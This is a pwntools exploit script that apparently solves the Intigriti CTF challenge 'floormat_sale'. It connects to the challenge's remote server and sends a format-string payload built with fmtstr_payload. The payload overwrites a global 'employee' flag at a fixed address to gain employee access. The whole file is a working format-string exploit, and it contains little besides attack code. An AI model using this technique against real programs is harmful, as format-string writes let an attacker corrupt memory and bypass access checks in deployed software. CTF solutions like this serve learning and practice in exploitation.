from pwn import *

e = context.binary = ELF("floormat_sale")

p = e.process()

#gdb.attach(p,"""
#	break  employee_access
#""")
p=remote("floormatsale.ctf.intigriti.io", 1339)

employee = 0x40408c
value = 0x1111111

print(p.recv().decode("utf-8"))
p.sendline("6")

offset = 10
print(p.recv())
payload = fmtstr_payload(offset,{employee: value})
#payload = b'A'*4+b'%p,'*50
p.sendline(payload)
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
